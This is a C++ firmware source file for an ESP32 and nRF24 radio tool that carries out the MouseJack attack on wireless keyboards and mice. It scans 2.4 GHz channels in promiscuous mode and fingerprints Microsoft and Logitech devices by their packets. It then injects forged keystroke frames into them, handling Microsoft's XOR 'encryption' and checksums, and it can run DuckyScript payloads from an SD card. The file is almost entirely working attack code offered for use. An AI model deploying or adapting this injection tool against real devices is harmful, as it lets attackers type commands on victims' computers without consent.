/**
 * @file MouseJack.cpp
 * @brief MouseJack scan, fingerprint, and HID injection implementation.
 *
 * Ported and adapted from the original EvilMouse project by Joel Sernamoreno,
 * refactored for the EvilCrow-RF-V2 architecture with BLE command support.
 */

#include "MouseJack.h"
#include "NrfModule.h"
#include "HidPayloads.h"
#include "core/ble/ClientsManager.h"
#include "BinaryMessages.h"
#include "SD.h"
#include "esp_log.h"

static const char* TAG = "MouseJack";

// Static member initialization
MjState      MouseJack::state_       = MJ_IDLE;
MjTarget     MouseJack::targets_[MJ_MAX_TARGETS] = {};
uint8_t      MouseJack::targetCount_ = 0;
uint16_t     MouseJack::msSequence_  = 0;
volatile bool MouseJack::stopRequest_ = false;
TaskHandle_t MouseJack::taskHandle_  = nullptr;

// ── Initialization ──────────────────────────────────────────────

bool MouseJack::init() {
    if (!NrfModule::isPresent()) {
        ESP_LOGW(TAG, "NRF module not present — MouseJack disabled");
        return false;
    }
    clearTargets();
    state_ = MJ_IDLE;
    ESP_LOGI(TAG, "MouseJack initialized");
    return true;
}

// ── Target Management ───────────────────────────────────────────

const MjTarget* MouseJack::getTargets() {
    return targets_;
}

uint8_t MouseJack::getTargetCount() {
    return targetCount_;
}

void MouseJack::clearTargets() {
    memset(targets_, 0, sizeof(targets_));
    targetCount_ = 0;
}

int MouseJack::findTarget(const uint8_t* addr, uint8_t addrLen) {
    for (uint8_t i = 0; i < targetCount_; i++) {
        if (targets_[i].active && targets_[i].addrLen == addrLen &&
            memcmp(targets_[i].address, addr, addrLen) == 0) {
            return i;
        }
    }
    return -1;
}

int MouseJack::addTarget(const uint8_t* addr, uint8_t addrLen,
                         uint8_t channel, MjDeviceType type) {
    // Check if already known
    int idx = findTarget(addr, addrLen);
    if (idx >= 0) {
        // Update channel if changed (device may hop)
        targets_[idx].channel = channel;
        return idx;
    }

    if (targetCount_ >= MJ_MAX_TARGETS) {
        ESP_LOGW(TAG, "Target list full (%d max)", MJ_MAX_TARGETS);
        return -1;
    }

    idx = targetCount_++;
    memcpy(targets_[idx].address, addr, addrLen);
    targets_[idx].addrLen = addrLen;
    targets_[idx].channel = channel;
    targets_[idx].type    = type;
    targets_[idx].active  = true;

    ESP_LOGI(TAG, "New target #%d: type=%d ch=%d addr=%02X:%02X:%02X:%02X:%02X",
             idx, type, channel,
             addr[0], addr[1], addrLen > 2 ? addr[2] : 0,
             addrLen > 3 ? addr[3] : 0, addrLen > 4 ? addr[4] : 0);

    // Send BLE notification: NRF_DEVICE_FOUND
    uint8_t notifBuf[16];
    notifBuf[0] = MSG_NRF_DEVICE_FOUND;
    notifBuf[1] = (uint8_t)idx;
    notifBuf[2] = (uint8_t)type;
    notifBuf[3] = channel;
    notifBuf[4] = addrLen;
    memcpy(notifBuf + 5, addr, addrLen);
    ClientsManager::getInstance().notifyAllBinary(
        NotificationType::NrfEvent, notifBuf, 5 + addrLen);

    return idx;
}

// ── Scanning ────────────────────────────────────────────────────

bool MouseJack::startScan() {
    if (state_ != MJ_IDLE) {
        ESP_LOGW(TAG, "Cannot start scan — state=%d", state_);
        return false;
    }

    if (!NrfModule::isPresent()) {
        ESP_LOGE(TAG, "NRF not present");
        return false;
    }

    stopRequest_ = false;
    state_ = MJ_SCANNING;

    // Create scan task (4KB stack, priority 2, Core 1)
    BaseType_t result = xTaskCreatePinnedToCore(
        scanTask, "MjScan", 4096, nullptr, 2, &taskHandle_, 1);

    if (result != pdPASS) {
        ESP_LOGE(TAG, "Failed to create scan task");
        state_ = MJ_IDLE;
        return false;
    }

    ESP_LOGI(TAG, "Scan started");
    return true;
}

void MouseJack::stopScan() {
    if (state_ != MJ_SCANNING) return;
    stopRequest_ = true;
    // Task will clean up and set state to IDLE
    ESP_LOGI(TAG, "Scan stop requested");
}

void MouseJack::scanTask(void* param) {
    ESP_LOGI(TAG, "Scan task started");

    while (!stopRequest_) {
        // Acquire SPI for a burst of channel scans
        if (!NrfModule::acquireSpi()) {
            ESP_LOGW(TAG, "SPI busy, retrying...");
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        // Configure promiscuous mode
        NrfModule::setDataRate(NRF_2MBPS);
        NrfModule::setPromiscuousMode();

        // Sweep channels 2-84 (2.402 - 2.484 GHz)
        for (uint8_t ch = 2; ch <= 84 && !stopRequest_; ch++) {
            NrfModule::setChannel(ch);

            // Listen for a short time on each channel
            for (int tries = 0; tries < 3 && !stopRequest_; tries++) {
                uint8_t rxBuf[32];
                uint8_t rxLen = NrfModule::receive(rxBuf, sizeof(rxBuf));

                if (rxLen > 0) {
                    fingerprint(rxBuf, rxLen, ch);
                }
                delayMicroseconds(200);
            }
        }

        NrfModule::ceLow();
        NrfModule::releaseSpi();

        // Small delay between full scans
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // Cleanup
    state_ = MJ_IDLE;
    taskHandle_ = nullptr;
    ESP_LOGI(TAG, "Scan task ended, %d targets found", targetCount_);

    // Send scan complete notification
    uint8_t notif[2] = { MSG_NRF_SCAN_COMPLETE, targetCount_ };
    ClientsManager::getInstance().notifyAllBinary(
        NotificationType::NrfEvent, notif, sizeof(notif));

    vTaskDelete(nullptr);
}

// ── CRC16-CCITT for promiscuous packet validation ───────────────

/**
 * Update CRC16-CCITT with 1-8 bits from a given byte.
 * Polynomial: 0x1021  Initial: 0xFFFF
 * Used by ESB (Enhanced ShockBurst) protocol for packet verification.
 */
static uint16_t crcUpdate(uint16_t crc, uint8_t byte, uint8_t bits) {
    crc = crc ^ ((uint16_t)byte << 8);
    while (bits--) {
        if ((crc & 0x8000) == 0x8000)
            crc = (crc << 1) ^ 0x1021;
        else
            crc = crc << 1;
    }
    return crc & 0xFFFF;
}

// ── Fingerprinting ──────────────────────────────────────────────

void MouseJack::fingerprint(const uint8_t* rawBuf, uint8_t size, uint8_t channel) {
    if (size < 10) return;

    // In promiscuous mode we receive raw on-air data. The ESB packet format:
    //   [preamble:1][address:2-5][PCF+payload_length:9bit][payload:N][CRC:2]
    // Since we're using 2-byte address width with 0xAA or 0x55 matching the
    // nRF24 preamble, the first bytes of the buffer contain the real device
    // address followed by the Packet Control Field.
    //
    // Following the uC_mousejack / WHID approach:
    // - Try both the raw buffer and a 1-bit right-shifted version
    //   (catches both 0xAA and 0x55 preamble alignments)
    // - Validate via CRC16-CCITT before accepting a packet

    uint8_t buf[37];
    if (size > 37) size = 37;
    memcpy(buf, rawBuf, size);

    for (int offset = 0; offset < 2; offset++) {
        // On second pass, shift entire buffer right by 1 bit
        // This handles the case where preamble alignment is off by 1 bit
        if (offset == 1) {
            memcpy(buf, rawBuf, size);  // Reset to original
            for (int x = size - 1; x >= 0; x--) {
                if (x > 0)
                    buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
                else
                    buf[x] = buf[x] >> 1;
            }
        }

        // Read payload length from Packet Control Field
        // The PCF starts at byte index 5 (after 5-byte address)
        // but with our 2-byte promiscuous address, address is at [0..4],
        // and payload length is in the upper 6 bits of byte [5]
        uint8_t payloadLength = buf[5] >> 2;

        // Validate: payload must fit within our buffer minus overhead
        // (address:5 + PCF:1 + CRC:2 = 8 bytes overhead)
        if (payloadLength == 0 || payloadLength > (size - 9)) {
            continue;
        }

        // Extract and verify CRC16-CCITT
        uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) |
                            ((uint16_t)buf[7 + payloadLength] << 1);
        crcGiven = (crcGiven << 8) | (crcGiven >> 8);
        if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;

        uint16_t crcCalc = 0xFFFF;
        for (int x = 0; x < 6 + payloadLength; x++) {
            crcCalc = crcUpdate(crcCalc, buf[x], 8);
        }
        crcCalc = crcUpdate(crcCalc, buf[6 + payloadLength] & 0x80, 1);
        crcCalc = (crcCalc << 8) | (crcCalc >> 8);

        if (crcCalc != crcGiven) {
            continue;  // CRC mismatch — not a valid ESB packet
        }

        // CRC verified! Extract the real device address (bytes 0-4)
        uint8_t addr[5];
        memcpy(addr, buf, 5);

        // Extract the actual ESB payload (after PCF byte)
        uint8_t esbPayload[32];
        for (int x = 0; x < payloadLength; x++) {
            esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
        }

        // Fingerprint the device from the ESB payload
        fingerprintPayload(esbPayload, payloadLength, addr, channel);
        return;  // Found a valid packet, stop trying
    }
}

void MouseJack::fingerprintPayload(const uint8_t* payload, uint8_t size,
                                   const uint8_t* addr, uint8_t channel) {
    // Microsoft Mouse detection:
    // size == 19 && payload[0] == 0x08 && payload[6] == 0x40  → unencrypted
    // size == 19 && payload[0] == 0x0A                         → encrypted
    if (size == 19) {
        if (payload[0] == 0x08 && payload[6] == 0x40) {
            addTarget(addr, 5, channel, MJ_DEVICE_MICROSOFT);
            return;
        }
        if (payload[0] == 0x0A) {
            addTarget(addr, 5, channel, MJ_DEVICE_MS_CRYPT);
            return;
        }
    }

    // Logitech detection (first byte is always 0x00):
    //   size == 10 && payload[1] == 0xC2  → keepalive
    //   size == 10 && payload[1] == 0x4F  → mouse movement
    //   size == 22 && payload[1] == 0xD3  → encrypted keystroke
    //   size == 5  && payload[1] == 0x40  → wake-up
    if (payload[0] == 0x00) {
        bool isLogitech = false;
        if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
            isLogitech = true;
        if (size == 22 && payload[1] == 0xD3)
            isLogitech = true;
        if (size == 5 && payload[1] == 0x40)
            isLogitech = true;

        if (isLogitech) {
            addTarget(addr, 5, channel, MJ_DEVICE_LOGITECH);
            return;
        }
    }
}

// ── Attacks ─────────────────────────────────────────────────────

// Attack task parameter (passed via pvParameter)
struct AttackParams {
    uint8_t targetIndex;
    uint8_t* payload;
    size_t   payloadLen;
    char*    text;      // For string injection
    char*    filePath;  // For DuckyScript
    enum { RAW_HID, STRING, DUCKY } mode;

    ~AttackParams() {
        delete[] payload;
        delete[] text;
        delete[] filePath;
    }
};

bool MouseJack::startAttack(uint8_t targetIndex,
                            const uint8_t* hidPayload, size_t payloadLen) {
    if (state_ != MJ_IDLE && state_ != MJ_FOUND) {
        ESP_LOGW(TAG, "Cannot attack — state=%d", state_);
        return false;
    }
    if (targetIndex >= targetCount_ || !targets_[targetIndex].active) {
        ESP_LOGE(TAG, "Invalid target index %d", targetIndex);
        return false;
    }

    auto* params = new AttackParams();
    params->targetIndex = targetIndex;
    params->payload = new uint8_t[payloadLen];
    memcpy(params->payload, hidPayload, payloadLen);
    params->payloadLen = payloadLen;
    params->text = nullptr;
    params->filePath = nullptr;
    params->mode = AttackParams::RAW_HID;

    stopRequest_ = false;
    state_ = MJ_ATTACKING;

    BaseType_t result = xTaskCreatePinnedToCore(
        attackTask, "MjAttack", 4096, params, 2, &taskHandle_, 1);

    if (result != pdPASS) {
        delete params;
        state_ = MJ_IDLE;
        return false;
    }
    return true;
}

bool MouseJack::injectString(uint8_t targetIndex, const char* text) {
    if (state_ != MJ_IDLE && state_ != MJ_FOUND) return false;
    if (targetIndex >= targetCount_) return false;

    auto* params = new AttackParams();
    params->targetIndex = targetIndex;
    params->payload = nullptr;
    params->payloadLen = 0;
    params->text = new char[strlen(text) + 1];
    strcpy(params->text, text);
    params->filePath = nullptr;
    params->mode = AttackParams::STRING;

    stopRequest_ = false;
    state_ = MJ_ATTACKING;

    BaseType_t result = xTaskCreatePinnedToCore(
        attackTask, "MjAttack", 4096, params, 2, &taskHandle_, 1);

    if (result != pdPASS) {
        delete params;
        state_ = MJ_IDLE;
        return false;
    }
    return true;
}

bool MouseJack::executeDuckyScript(uint8_t targetIndex, const char* filePath) {
    if (state_ != MJ_IDLE && state_ != MJ_FOUND) return false;
    if (targetIndex >= targetCount_) return false;

    auto* params = new AttackParams();
    params->targetIndex = targetIndex;
    params->payload = nullptr;
    params->payloadLen = 0;
    params->text = nullptr;
    params->filePath = new char[strlen(filePath) + 1];
    strcpy(params->filePath, filePath);
    params->mode = AttackParams::DUCKY;

    stopRequest_ = false;
    state_ = MJ_ATTACKING;

    BaseType_t result = xTaskCreatePinnedToCore(
        attackTask, "MjAttack", 6144, params, 2, &taskHandle_, 1);

    if (result != pdPASS) {
        delete params;
        state_ = MJ_IDLE;
        return false;
    }
    return true;
}

void MouseJack::stopAttack() {
    if (state_ != MJ_ATTACKING) return;
    stopRequest_ = true;
    ESP_LOGI(TAG, "Attack stop requested");
}

void MouseJack::attackTask(void* param) {
    auto* params = static_cast<AttackParams*>(param);
    uint8_t tIdx = params->targetIndex;
    const MjTarget& target = targets_[tIdx];

    ESP_LOGI(TAG, "Attack task started on target %d (type=%d)", tIdx, target.type);

    if (!NrfModule::acquireSpi()) {
        ESP_LOGE(TAG, "SPI busy for attack");
        goto cleanup;
    }

    // Configure TX mode for the target (matches uC_mousejack start_transmit)
    NrfModule::setDataRate(NRF_2MBPS);
    NrfModule::setPALevel(3);  // Max power
    NrfModule::setChannel(target.channel);
    NrfModule::setAddressWidth(5);  // Always use 5-byte addresses for TX
    NrfModule::setTxMode(target.address, target.addrLen);

    // Sync MS serial sequence with 6 null frames (from uC_mousejack)
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        msSequence_ = 0;
        for (int i = 0; i < 6; i++) {
            msTransmit(target, 0, 0);
        }
    }

    switch (params->mode) {
        case AttackParams::RAW_HID: {
            // Inject raw HID payload bytes
            // Interpret as pairs: [modifier, keycode, modifier, keycode, ...]
            for (size_t i = 0; i + 1 < params->payloadLen && !stopRequest_; i += 2) {
                uint8_t meta = params->payload[i];
                uint8_t hid  = params->payload[i + 1];

                if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
                    msTransmit(target, meta, hid);
                } else if (target.type == MJ_DEVICE_LOGITECH) {
                    logTransmit(target, meta, &hid, 1);
                }
                vTaskDelay(pdMS_TO_TICKS(10));
            }
            break;
        }

        case AttackParams::STRING: {
            // Inject ASCII string as keystrokes
            const char* text = params->text;
            for (size_t i = 0; text[i] != '\0' && !stopRequest_; i++) {
                HidKeyEntry entry;
                if (text[i] == '\n') {
                    entry.modifier = HID_MOD_NONE;
                    entry.keycode  = HID_KEY_ENTER;
                } else if (!asciiToHid(text[i], entry)) {
                    continue;  // Skip unmappable chars
                }

                if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
                    msTransmit(target, entry.modifier, entry.keycode);
                } else if (target.type == MJ_DEVICE_LOGITECH) {
                    logTransmit(target, entry.modifier, &entry.keycode, 1);
                }

                // Key release
                if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
                    msTransmit(target, 0, 0);
                } else {
                    uint8_t none = 0;
                    logTransmit(target, 0, &none, 1);
                }
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            break;
        }

        case AttackParams::DUCKY: {
            // Parse and execute DuckyScript file
            File file = SD.open(params->filePath);
            if (!file) {
                ESP_LOGE(TAG, "Failed to open DuckyScript: %s", params->filePath);
                break;
            }

            while (file.available() && !stopRequest_) {
                String line = file.readStringUntil('\n');
                line.trim();
                if (line.length() > 0) {
                    parseDuckyLine(line, tIdx);
                }
            }
            file.close();
            break;
        }
    }

    NrfModule::ceLow();
    NrfModule::releaseSpi();

cleanup:
    delete params;
    state_ = MJ_IDLE;
    taskHandle_ = nullptr;

    // Send attack complete notification
    uint8_t notif[2] = { MSG_NRF_ATTACK_COMPLETE, tIdx };
    ClientsManager::getInstance().notifyAllBinary(
        NotificationType::NrfEvent, notif, sizeof(notif));

    ESP_LOGI(TAG, "Attack task ended");
    vTaskDelete(nullptr);
}

// ── Microsoft Protocol ──────────────────────────────────────────

void MouseJack::msTransmit(const MjTarget& target, uint8_t meta, uint8_t hid) {
    // Microsoft wireless keyboard frame (19 bytes)
    // Layout (from uC_mousejack / WHID reference):
    //   [0] = 0x08 frame type (keyboard)
    //   [1..3] = device info / padding
    //   [4] = sequence low byte
    //   [5] = sequence high byte
    //   [6] = 0x43 (67) = keyboard data flag
    //   [7] = HID modifier
    //   [8] = reserved
    //   [9] = HID keycode
    //   [10..17] = padding zeros
    //   [18] = checksum
    uint8_t frame[19];
    memset(frame, 0, sizeof(frame));

    frame[0]  = 0x08;     // Frame type: keyboard
    frame[4]  = (uint8_t)(msSequence_ & 0xFF);       // Sequence low
    frame[5]  = (uint8_t)((msSequence_ >> 8) & 0xFF); // Sequence high
    frame[6]  = 67;       // 0x43 = keyboard data flag
    frame[7]  = meta;     // HID modifier
    frame[9]  = hid;      // HID keycode

    msSequence_++;

    // Apply checksum
    msChecksum(frame, sizeof(frame));

    // Apply encryption if target is encrypted Microsoft
    if (target.type == MJ_DEVICE_MS_CRYPT) {
        msCrypt(frame, sizeof(frame), target.address);
    }

    // Transmit key down
    NrfModule::transmit(frame, sizeof(frame));
    delay(5);

    // Transmit key up (null keystroke, same frame structure)
    if (target.type == MJ_DEVICE_MS_CRYPT) {
        // Decrypt first so we can modify plain data
        msCrypt(frame, sizeof(frame), target.address);
    }
    for (int n = 4; n < 18; n++) frame[n] = 0;
    frame[4]  = (uint8_t)(msSequence_ & 0xFF);
    frame[5]  = (uint8_t)((msSequence_ >> 8) & 0xFF);
    frame[6]  = 67;
    msSequence_++;
    msChecksum(frame, sizeof(frame));
    if (target.type == MJ_DEVICE_MS_CRYPT) {
        msCrypt(frame, sizeof(frame), target.address);
    }
    NrfModule::transmit(frame, sizeof(frame));
    delay(5);
}

void MouseJack::msCrypt(uint8_t* payload, uint8_t size, const uint8_t* addr) {
    // Microsoft "encryption": XOR bytes from index 4 onwards with address
    // Each byte at position i (≥4) is XORed with addr[(i-4) % 5]
    for (uint8_t i = 4; i < size; i++) {
        payload[i] ^= addr[((i - 4) % 5)];
    }
}

void MouseJack::msChecksum(uint8_t* payload, uint8_t size) {
    // Microsoft uses a simple checksum in the last byte
    // XOR all bytes except the last one
    uint8_t checksum = 0;
    for (uint8_t i = 0; i < size - 1; i++) {
        checksum ^= payload[i];
    }
    // Negate for verification
    payload[size - 1] = ~checksum;
}

// ── Logitech Protocol ───────────────────────────────────────────

void MouseJack::logTransmit(const MjTarget& target, uint8_t meta,
                            const uint8_t* keys, uint8_t keysLen) {
    // Logitech Unifying keyboard frame (10 bytes)
    // [0x00][type:0xC1][meta:1][key1..key6][checksum]
    uint8_t frame[10];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x00;    // Start byte
    frame[1] = 0xC1;    // Set Keep-Alive Timeout type (keyboard frame)
    frame[2] = meta;    // Modifier keys

    // Fill in key codes (up to 6)
    for (uint8_t i = 0; i < keysLen && i < 6; i++) {
        frame[3 + i] = keys[i];
    }

    // Logitech checksum: 0xFF minus sum of all preceding bytes, plus 1
    // This is the two's complement checksum used by Logitech Unifying.
    uint8_t cksum = 0xFF;
    for (uint8_t i = 0; i < 9; i++) {
        cksum -= frame[i];
    }
    cksum++;
    frame[9] = cksum;

    NrfModule::transmit(frame, sizeof(frame));
}

// ── DuckyScript Parser ──────────────────────────────────────────

bool MouseJack::parseDuckyLine(const String& line, uint8_t targetIndex) {
    const MjTarget& target = targets_[targetIndex];

    if (line.startsWith("REM") || line.startsWith("//")) {
        return true;  // Comment, skip
    }

    if (line.startsWith("DELAY")) {
        int delayMs = line.substring(6).toInt();
        if (delayMs > 0 && delayMs <= 30000) {
            vTaskDelay(pdMS_TO_TICKS(delayMs));
        }
        return true;
    }

    if (line.startsWith("STRING ")) {
        String text = line.substring(7);
        for (size_t i = 0; i < text.length() && !stopRequest_; i++) {
            HidKeyEntry entry;
            if (!asciiToHid(text.charAt(i), entry)) continue;

            if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
                msTransmit(target, entry.modifier, entry.keycode);
            } else {
                logTransmit(target, entry.modifier, &entry.keycode, 1);
            }
            // Key release
            if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
                msTransmit(target, 0, 0);
            } else {
                uint8_t none = 0;
                logTransmit(target, 0, &none, 1);
            }
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        return true;
    }

    // Handle key names: ENTER, TAB, GUI r, CTRL ALT DELETE, etc.
    // Split by space to handle combinations like "GUI r"
    uint8_t combinedMod = 0;
    uint8_t keycode = 0;

    int spaceIdx = line.indexOf(' ');
    String firstToken = (spaceIdx > 0) ? line.substring(0, spaceIdx) : line;
    String secondToken = (spaceIdx > 0) ? line.substring(spaceIdx + 1) : "";

    firstToken.trim();
    secondToken.trim();

    // Look up first token in DUCKY_KEYS
    bool found = false;
    for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
        if (firstToken.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
            combinedMod = DUCKY_KEYS[i].modifier;
            keycode = DUCKY_KEYS[i].keycode;
            found = true;
            break;
        }
    }

    if (!found) return false;

    // If there's a second token, it could be a single char key or another key name
    if (secondToken.length() == 1) {
        HidKeyEntry entry;
        if (asciiToHid(secondToken.charAt(0), entry)) {
            combinedMod |= entry.modifier;
            keycode = entry.keycode;
        }
    } else if (secondToken.length() > 1) {
        for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
            if (secondToken.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
                combinedMod |= DUCKY_KEYS[i].modifier;
                if (DUCKY_KEYS[i].keycode != 0) {
                    keycode = DUCKY_KEYS[i].keycode;
                }
                break;
            }
        }
    }

    // Send the keystroke
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        msTransmit(target, combinedMod, keycode);
    } else {
        logTransmit(target, combinedMod, &keycode, 1);
    }

    // Key release
    vTaskDelay(pdMS_TO_TICKS(10));
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        msTransmit(target, 0, 0);
    } else {
        uint8_t none = 0;
        logTransmit(target, 0, &none, 1);
    }

    return true;
}
